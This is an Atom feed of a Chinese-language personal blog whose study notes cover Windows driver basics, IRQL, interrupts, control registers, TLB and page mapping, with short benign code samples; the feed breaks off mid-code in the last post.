<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="https://xia0ji233.github.io/atom.xml" rel="self"/>
  
  <link href="https://xia0ji233.github.io/"/>
  <updated>2024-11-22T19:02:08.907Z</updated>
  <id>https://xia0ji233.github.io/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows驱动开发（0）——Windows驱动开发的基础知识</title>
    <link href="https://xia0ji233.github.io/2024/11/23/WindowsDriver0/"/>
    <id>https://xia0ji233.github.io/2024/11/23/WindowsDriver0/</id>
    <published>2024-11-22T19:00:00.000Z</published>
    <updated>2024-11-22T19:02:08.907Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下Windows驱动开发基础</p><span id="more"></span><p>由于之前操之过急，对驱动开发很多东西都没有了解便强行上手，导致后面困难重重，于是痛定思痛，开始推翻重来，相信之前的一些开发经验会让这一路好走一点。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vmware + VirtualKD + windbg preview 做调试环境。</p><p>VS 2022 + WDK 做开发环境。</p><p><a href="https://xia0ji233.pro/2023/04/13/driver1/">参考链接1</a></p><p><a href="https://xia0ji233.pro/2023/05/17/driver8/">参考链接2</a></p><h2 id="内核API的使用"><a href="#内核API的使用" class="headerlink" title="内核API的使用"></a>内核API的使用</h2><p>对于导出的函数，只需要包含对应的头文件直接使用即可，内核 API 的返回类型几乎都是 NTSTATUS。</p><p>当你调用的内核函数，如果返回的结果不是<code>STATUS_SUCCESS</code>，就说明函数执行中遇到了问题，具体是什么问题，可以在<code>ntstatus.h</code>文件中查看。</p><h2 id="驱动基本数据类型"><a href="#驱动基本数据类型" class="headerlink" title="驱动基本数据类型"></a>驱动基本数据类型</h2><p>WDK 对于一些标量有自己的书写习惯</p><table><thead><tr><th align="center">WDK 习惯</th><th align="center">SDK 习惯</th></tr></thead><tbody><tr><td align="center">ULONG</td><td align="center">unsigned long</td></tr><tr><td align="center">PULONG</td><td align="center">unsigned long*</td></tr><tr><td align="center">UCHAR</td><td align="center">unsigned char</td></tr><tr><td align="center">PUCHAR</td><td align="center">unsigned char*</td></tr><tr><td align="center">UINT</td><td align="center">unsigned int</td></tr><tr><td align="center">PUNIT</td><td align="center">unsigned int*</td></tr><tr><td align="center">VOID</td><td align="center">void</td></tr><tr><td align="center">PVOID</td><td align="center">void*</td></tr></tbody></table><h2 id="常用的内核内存函数"><a href="#常用的内核内存函数" class="headerlink" title="常用的内核内存函数"></a>常用的内核内存函数</h2><p>即，如何使用内核的堆内存，在用户层我们知道可以使用 malloc 或者一些 windows API，就算没有库也可以使用系统调用去申请内存。但是在内核层，内核的开发环境同样支持了一系列的内存分配函数。</p><p>内存对应的操作有：分配，释放，拷贝，清空。</p><table><thead><tr><th align="center">普通程序</th><th align="center">内核中</th></tr></thead><tbody><tr><td align="center">malloc</td><td align="center">ExAllocatePoolWithTag</td></tr><tr><td align="center">memset</td><td align="center">RtlFillMemory</td></tr><tr><td align="center">memcpy</td><td align="center">RtlMoveMemory</td></tr><tr><td align="center">free</td><td align="center">ExFreePool</td></tr></tbody></table><p>这里有个概念需要补一下，什么是<strong>分页内存</strong>，什么是<strong>非分页内存</strong>。</p><p>在使用 ExAllocatePoolWithTag 函数申请内存的时候会有<code>POOL_TYPE PoolType</code>这个参数。那么什么是<code>POOL_TYPE</code>，通过 WDK 我们可以看到定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">POOL_TYPE</span> &#123;</span></span><br><span class="line">    NonPagedPool,</span><br><span class="line">    PagedPool,</span><br><span class="line">    NonPagedPoolMustSucceed,</span><br><span class="line">    DontUseThisType,</span><br><span class="line">    NonPagedPoolCacheAligned,</span><br><span class="line">    PagedPoolCacheAligned,</span><br><span class="line">    NonPagedPoolCacheAlignedMustS</span><br><span class="line">&#125; POOL_TYPE;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用的最多的就是前两个，<code>NonPagedPool</code>和<code>PagedPool</code>，前者分配<strong>非分页内存</strong>，后者申请<strong>分页内存</strong>。什么是<strong>分页内存</strong>，前面介绍过，在 Windows 操作系统中，有 pagefile.sys 这个文件，这个文件会保存长期不使用的物理页，如果申请<strong>分页内存</strong>，那么这个页就有可能会被置换到这个文件中去。等到再次需要的时候，会通过一个 0xE 号中断将该页从 pagefile.sys 中又取出来。</p><p>而<strong>非分页内存</strong>就是告诉操作系统，不要把我的申请的物理页撤走，这就是我独享的物理页。操作系统就不会把它给撤走转到文件中了。</p><p>至于有什么用，后面应该会看到。</p><h2 id="内核字符串"><a href="#内核字符串" class="headerlink" title="内核字符串"></a>内核字符串</h2><p>内核有两种字符串类型。<code>ANSI_STRING</code>&#x2F;<code>UNICODE_STRING</code> 分别表示 ASCII 字符和宽字符。</p><p>来看看它们的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125;STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaxmumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure><p>几乎都是这样的定义：长度，最大长度，字符指针，原因就是内核需要非常安全，直接操作字符容易造成一系列不可控的后果，因此在原字符指针上再封装一层。</p><p>同样来看看字符串的基本操作的 API </p><p>创建、复制、比较以及转换等。它们的函数如下：</p><table><thead><tr><th align="center">ANSI_STRING</th><th align="center">UNICODE_STRING</th></tr></thead><tbody><tr><td align="center">RtlInitAnsiString</td><td align="center">RtlInitUnicodeString</td></tr><tr><td align="center">RtlCopyString</td><td align="center">RtlCopyUnicodeString</td></tr><tr><td align="center">RtlCompareString</td><td align="center">RtlCompareUnicodeString</td></tr><tr><td align="center">RtlAnsiStringToUnicodeString</td><td align="center">RtlUnicodeStringToAnsiString</td></tr></tbody></table><h2 id="驱动代码解析"><a href="#驱动代码解析" class="headerlink" title="驱动代码解析"></a>驱动代码解析</h2><p>还是拿最经典的 hello world 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h3><p><code>DriverEntry</code>是驱动程序的入口，如果驱动加载成功后，就像<code>Dll</code>加载成功调用<code>DllMain</code>函数一样，调用该函数。</p><p>但是，编译成功后可以发现，DriverEntry 跟 main 一样，并不是程序加载最先调用的，都是间接被调用的，而真正的入口是 FxDriverEntry。</p><img src="/2024/11/23/WindowsDriver0/1.png" class=""><p>并且该函数是被导出的。</p><p>DriverEntry 的第一个参数需要来解析一下，它的类型是 <code>PDRIVER_OBJECT</code>，熟悉 Windows SDK 命名的应该知道，它是一个指向 <code>DRIVER_OBJECT</code> 的指针。</p><p>驱动文件加载之后，驱动的所有信息通过这个结构体来返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以在驱动中加个断点，来查看这个对象</p><img src="/2024/11/23/WindowsDriver0/2.png" class=""><p>这里逐步分析该结构体的各个字段意义</p><ul><li>Type：类型</li><li>Size：结构体大小</li><li>DeviceObject：设备对象</li><li>Flags：标志位</li><li>DriverStart：驱动对象加载后的起始地址</li><li>DriverSize：驱动对象加载后的内存大小</li><li>DriverSection：它是一个存储目前所有已加载的驱动程序信息相关的<code>LDR_DATA_TABLE_ENTRY</code>结构体的双向循环链表。</li><li>DriverName：驱动名</li><li>DriverUnload：驱动对象的卸载地址，如果存在则会调用它</li></ul><p>其余就不一一写出了。</p><h2 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h2><p><code>IRQL</code>全称<code>Interrupt Request Level</code>，即<strong>中断请求等级</strong>。它是<code>Windows</code>自己定义的一套优先级方案，与<code>CPU</code>无关，数值越大权限越高。中断包括了硬中断和软中断，硬中断是由硬件产生，而软中断则是完全虚拟出来的。处理器在一个<code>IRQL</code>上执行线程代码，每个处理器的<code>IRQL</code>决定了它如何处理中断，以及允许接收哪些中断。在同一处理器上，线程只能被更高级别<code>IRQL</code>的线程能中断。每个处理器都有自己的中断<code>IRQL</code>。</p><img src="/2024/11/23/WindowsDriver0/3.png" class=""><p>常见的<code>IRQL</code>级别有四个：<code>Passive</code>、<code>APC</code>、<code>Dispatch</code>、<code>DIRQL</code>。<code>PASSIVE_LEVEL</code>是最低级别，没有被屏蔽的中断，线程执行用户模式，可以访问分页内存。</p><p><code>APC_LEVEL</code>只有<code>APC</code>级别的中断被屏蔽，可以访问分页内存。当有<code>APC</code>发生时，处理器提升到<code>APC</code>级别，就屏蔽掉其它<code>APC</code>。</p><p><code>DISPATCH_LEVEL</code>可以屏蔽<code>DPC</code>(延迟过程) 和更低的中断，不能访问分页内存。</p><h2 id="关于分页内存和非分页内存"><a href="#关于分页内存和非分页内存" class="headerlink" title="关于分页内存和非分页内存"></a>关于分页内存和非分页内存</h2><p>上面提到，中断等级在 <code>DISPATCH_LEVEL</code> 及以上时无法访问分页内存。因为分页内存会被换到外存，如果想要加载到内存中会触发一个缺页中断，将该页重新加载进内存，该例程运行在 <code>DISPATCH_LEVEL</code> 的中断等级下。而这个所谓的中断是不允许同级打断的，因此在 <code>DISPATCH_LEVEL</code> 下访问分页内存会导致访问内存的线程一直尝试等待物理页被写入内存，而触发的中断又无法直接打断该例程，就有可能直接造成蓝屏。</p><p>而根据看雪某帖子下面的评论描述，访问分页内存的时候会同时判断 IRQL 和物理页的 valid 位，当 <code>IRQL &gt; APC_LEVEL</code> 且物理页 <code>valid=0</code> 时，直接蓝屏。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15491543.html">https://www.cnblogs.com/wingsummer/p/15491543.html</a></li><li>[2]：<a href="https://bbs.kanxue.com/thread-160200.htm">https://bbs.kanxue.com/thread-160200.htm</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下Windows驱动开发基础</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（6）——中断与异常和控制寄存器</title>
    <link href="https://xia0ji233.github.io/2024/11/22/WindowsKernel6/"/>
    <id>https://xia0ji233.github.io/2024/11/22/WindowsKernel6/</id>
    <published>2024-11-22T07:00:00.000Z</published>
    <updated>2024-11-22T07:49:37.354Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下X86中断与异常和控制寄存器</p><span id="more"></span><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断通常是由<code>CPU</code>外部的输入输出设备（硬件）所触发的，供外部设备通知<code>CPU</code>有事情需要处理，因此又叫中断请求，英文为<code>Interrupt Request</code>。中断请求的目的是希望<code>CPU</code>暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程，中断处理程序由 IDT 表决定。</p><p><code>80x86</code> 有两条中断请求线：非屏蔽中断线，<code>NMI</code>，全称<code>NonMaskable Interrupt</code>和可屏蔽中断线，<code>INTR</code>，全称<code>Interrupt Require</code>。</p><h3 id="可屏蔽中断"><a href="#可屏蔽中断" class="headerlink" title="可屏蔽中断"></a>可屏蔽中断</h3><p>CPU 的 EFLAGS 有一个 IF 位，它表示了 CPU 当前是否接受可屏蔽中断请求，下面是 EFLAGS 寄存器的图解</p><img src="/2024/11/22/WindowsKernel6/1.png" class=""><p>IF 是第九位，权值为 0x200，这也就是为什么在用户态我们看到的 EFLAGS 值几乎都是 2xx，因为用户态几乎不允许把该位复位，复位该位需要特权指令 cli 来操作，而重新设置指令需要 sti 来操作。</p><p>IF &#x3D; 1 的时候，可屏蔽中断请求可以被执行，IF &#x3D; 0 的时候，可屏蔽中断会被屏蔽，不会被执行，不可屏蔽中断走的是 CPU 的NMI引脚，而可屏蔽中断走的就是INTR引脚。</p><p>在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求.为了便于标识各个中断请求，中断管理器通常用<code>IRQ</code>，全称为<code>Interrupt Request</code>，后面加上数字来表示不同的中断，例如在键盘设备中，可以看到键盘的请求是一号中断</p><img src="/2024/11/22/WindowsKernel6/2.png" class=""><h3 id="不可屏蔽中断"><a href="#不可屏蔽中断" class="headerlink" title="不可屏蔽中断"></a>不可屏蔽中断</h3><p>不赘述了，就是 CPU 收到就必须立刻执行的事件，诸如CPU掉电，总线校验错误，内存校验错误，看门狗错误等，一旦发生了这些事件，硬件会向 CPU 的 NMI 引脚发送一个中断请求要求 CPU 立刻响应。不过大部分的 NMI 可能都表示着CPU生存周期的终结（出现的故障无法恢复），当然也有一些软件产生的 NMI 中断，可能在执行完事件处理程序之后，会允许 CPU 继续运行。</p><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常通常是<code>CPU</code>在执行指令时检测到的某些错误，比如除0、访问无效页等。也可以看出，异常是 CPU 主动触发的，是在检测到一些指令不符合某些要求的时候触发的。而中断是由外部设备（中断源）向CPU请求的，是被动的。<code>int n</code> 虽然这个指令是中断（<strong>Interrupt</strong>）的缩写，但是它本质还是 CPU 主动触发了一个异常，就跟除法的时候检测到了被除数为零是差不多的。</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>无论是由硬件设备触发的中断请求还是由<code>CPU</code>产生的异常，处理程序都在<code>IDT</code>表。常见的异常处理程序如下表所示：</p><table><thead><tr><th align="center">错误类型</th><th align="center">（IDT表）中断号</th></tr></thead><tbody><tr><td align="center">页错误</td><td align="center">0xE</td></tr><tr><td align="center">段错误</td><td align="center">0xD</td></tr><tr><td align="center">除零错误</td><td align="center">0x0</td></tr><tr><td align="center">双重错误</td><td align="center">0x8</td></tr></tbody></table><h4 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h4><p>这是 CPU 主动触发的比较多的异常，当<code>PDE/PTE</code> 的 <code>P=0</code> 时或当<code>PDE/PTE</code>的属性为只读但程序试图写入的时就会触发。一旦发生缺页异常，<code>CPU</code>会执行<code>IDT</code>表中的<code>0xE</code>中断处理程序，由操作系统来接管。</p><p>在 Windows 操作系统中，大家都听过 pagefile.sys，它占用空间很大并且无时无刻不被写入，以前问过一个很蠢的问题就是，这个文件是否能删？先来了解一下这个文件是干啥的，答：为了节省物理内存。由于程序局部性的原理，一个程序所占用的物理页，很可能只有一小部分的数据会被频繁读写或者执行，大部分数据可能都不会反复被使用，那么对于这样一部分的物理页，操作系统会选择将该物理页保存到外部文件，也就是这个 pagefile.sys，也就是这个物理页不会被挂上去了。但是当再一次需要使用的时候怎么办呢，此时找不到对应的物理页，CPU 报告一个缺页异常，调用 IDT 表的 0xE 中断程序去处理，发现这个虚拟内存事实上是有对应的物理内存，只是现在被交换到外部文件当中，那就重新指定一个物理页，把内容写回重新挂上，向CPU报告“这个虚拟内存已经被正确挂上了物理页，可以访问了”，那么CPU重新执行这条指令之后就不会报错了就接着运行。</p><p>可以说，缺页异常在操作系统中是无时无刻不在发生。就连刚申请的内存页，在不访问之前也是不会挂物理页的（即不实际占用内存），在第一次访问的时候会引发缺页异常，发现这个页是正确的，只是没被挂物理页，那么挂上物理页之后重新执行再返回。</p><h2 id="控制寄存器介绍"><a href="#控制寄存器介绍" class="headerlink" title="控制寄存器介绍"></a>控制寄存器介绍</h2><p>控制寄存器（CR0、CR2、CR3、CR4）中有一些标志和数据域用于控制系统级操作，另外一些标志则专用来支持操作系统和管理程序，其中，CR1作保留目前不使用。</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>CR0寄存器中含有控制处理器操作模式和状态的系统控制标志，可以说它是总开关的集合体。如下图所示：</p><img src="/2024/11/22/WindowsKernel6/3.png" class=""><p>这里解释几个重要的位</p><ul><li><code>PE</code>位是启用保护模式（Protection Enable）标志。若<code>PE = 1</code>是开启保护模式，反之为实地址模式。这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么<code>PE</code>和<code>PG</code>标志都要置位。</li><li><code>PG</code>位是启用分页机制。在开启这个标志之前必须已经或者同时开启<code>PE</code>标志。<code>PG = 0</code>且<code>PE = 0</code>，处理器工作在实地址模式下。<code>PG = 0</code>且<code>PE = 1</code>，处理器工作在没有开启分页机制的保护模式下。<code>PG = 1</code>且<code>PE = 0</code>，在<code>PE</code>没有开启的情况下无法开启<code>PG</code>。<code>PG = 1</code>且<code>PE = 1</code>，处理器       工作在开启了分页机制的保护模式下。</li><li><code>WP</code>位对于<code>Intel 80486</code>或以上的<code>CPU</code>，是写保护（Write Proctect）标志。当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作；当<code>CPL &lt; 3</code>的时候，如果<code>WP = 0</code>可以读写任意用户级物理页，只要线性地址有效。如果<code>WP = 1</code>可以读取任意用户级物理页，但对于只读的物理页，则不能写。</li></ul><h3 id="CR1"><a href="#CR1" class="headerlink" title="CR1"></a>CR1</h3><p>保留，暂不使用</p><h3 id="CR2"><a href="#CR2" class="headerlink" title="CR2"></a>CR2</h3><p>当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在CR2中。</p><h3 id="CR3"><a href="#CR3" class="headerlink" title="CR3"></a>CR3</h3><p>CR3含有存放页目录表页的物理地址，因此CR3也被称为PDBR（Page-Directory Base address Register，页目录基地址寄存器）。因此前面提到的，dirbase 就是 CR3 的值，事实上任务的切换也依赖于 CR3 寄存器。</p><h3 id="CR4"><a href="#CR4" class="headerlink" title="CR4"></a>CR4</h3><p><code>Cr4</code>的结构如下图所示：</p><img src="/2024/11/22/WindowsKernel6/4.png" class=""><p><code>VME</code>用于虚拟8086模式。<code>PAE</code>用于确认是哪个分页，<code>PAE = 1</code>，是<code>2-9-9-12</code>分页，<code>PAE = 0</code>是<code>10-10-12</code>分页。<code>PSE</code>是大页是否开启的总开关，如果置0，就算<code>PDE</code>中设置了大页你也得是普通的页。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364650.html">https://www.cnblogs.com/wingsummer/p/15364650.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_7/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_7&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下X86中断与异常和控制寄存器</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（5）——TLB</title>
    <link href="https://xia0ji233.github.io/2024/11/11/WindowsKernel5/"/>
    <id>https://xia0ji233.github.io/2024/11/11/WindowsKernel5/</id>
    <published>2024-11-11T14:00:00.000Z</published>
    <updated>2024-11-11T14:49:46.309Z</updated>
    
    <content type="html"><![CDATA[<p>今天来学习一下TLB的一些细节</p><span id="more"></span><h2 id="TLB简介"><a href="#TLB简介" class="headerlink" title="TLB简介"></a>TLB简介</h2><p>TLB（Translation Lookaside Buffer，转换后援缓冲器），是一个硬件单元，它用于保存每个进程虚拟地址到物理地址的映射，这里做的对进程的区分大概是使用 CR3 区分的，这个点看很多文章都没有提到，但是仅仅保存线性地址到物理地址的映射是必然不够的，因为不同的进程的同一线性地址不一定对应相同的物理页，但是猜测大概是这样的。</p><p>TLB 做了指令和数据的区分，ITLB专门存放指令页（可执行页），DTLB专门存放数据页（不可执行）</p><p>而根据大页与小页的区别，又可分为大页 TLB 和小页 TLB。将线性地址右移一定位数（页内偏移的位数，小页12，2-9-9-12大页为 21，10-10-12 大页为 22）</p><p>这里就可以分为四种了。</p><ol><li>第一组：缓存一般页表（4K字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第二组：缓存一般页表（4K字节页面）的数据页表缓存（Data-TLB）；</li><li>第三组：缓存大尺寸页表（2M&#x2F;4M字节页面）的指令页表缓存（Instruction-TLB）；</li><li>第四组：缓存大尺寸页表（2M&#x2F;4M字节页面）的数据页表缓存（Data-TLB）</li></ol><p>TLB 的结构可以视为一张表格</p><table><thead><tr><th>虚拟页帧</th><th>物理页帧</th><th>属性</th><th>命中次数</th></tr></thead><tbody><tr><td>0x1234</td><td>0x1010</td><td>r-x</td><td>5</td></tr><tr><td>0x1111</td><td>0x1000</td><td>r-x</td><td>3</td></tr></tbody></table><p>上表为例，假设是 ITLB，小页，那么这里有两个条目，分别是：</p><ul><li>线性地址 0x1234000 对应了物理地址 0x1010000。</li><li>线性地址 0x111000 对应了物理地址 0x1000000。</li></ul><p>这里的属性不一定只有读写属性，可能还有一系列的其它属性。</p><p>这里有以下注意的点</p><ol><li>不同的CPU，TLB大小不同。</li><li>只要 CR3 发生变化，TLB立即刷新，一核一套TLB。</li><li>G位只对大页 PDE 和 PTE 有效，当 G 位为 1 时，刷新 TLB 将不会刷新 PTE。</li><li>G位为1的页，当TLB写满时，根据命中次数的字段计算访问频率，将最近一段时间内未被访问的条目驱逐。</li></ol><h2 id="TLB探测"><a href="#TLB探测" class="headerlink" title="TLB探测"></a>TLB探测</h2><p>其实很简单，尝试分配两个页，一个写 a，一个写 b，先将 a 的物理页挂到 0 地址，读取；再将 b 的物理页挂到 0 地址，再次读取，如果读取得到的值一样，就证明了缓存是存在的。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15364648.html">https://www.cnblogs.com/wingsummer/p/15364648.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_5/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_5&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天来学习一下TLB的一些细节</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核（4）——挂物理页</title>
    <link href="https://xia0ji233.github.io/2024/11/10/WindowsKernel4/"/>
    <id>https://xia0ji233.github.io/2024/11/10/WindowsKernel4/</id>
    <published>2024-11-10T13:00:00.000Z</published>
    <updated>2024-11-10T13:42:24.447Z</updated>
    
    <content type="html"><![CDATA[<p>挂物理页的一些细节</p><span id="more"></span><h2 id="线性地址有效性判断"><a href="#线性地址有效性判断" class="headerlink" title="线性地址有效性判断"></a>线性地址有效性判断</h2><p>之前我们分析过 <code>MmIsValidAddress</code> 函数，在 10-10-12 分页模式下就是去拿到页表的线性地址，然后判断 PTE 和 PDE 的P位是否都有效。一般来说，如果都有效说明进程在这个线性地址这里挂上了物理页。</p><h2 id="零地址挂页"><a href="#零地址挂页" class="headerlink" title="零地址挂页"></a>零地址挂页</h2><p>考虑以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *x=<span class="literal">NULL</span>;</span><br><span class="line">*x=<span class="number">100</span>;</span><br></pre></td></tr></table></figure><p>通常情况下我们会认为这两条语句执行之后必然出错，这就是所谓的空指针错误，但是空指针真的不能写值吗？未必，只是通常情况下不会在上面挂物理页，而对一个线性地址的内存进行读或写操作都会校验这个线性地址是否有效，如果无效则会抛出异常 crash 程序。</p><p>以 10-10-12 分页为例，写出以下的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID addr=VirtualAlloc(<span class="literal">NULL</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">memset</span>(addr,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span 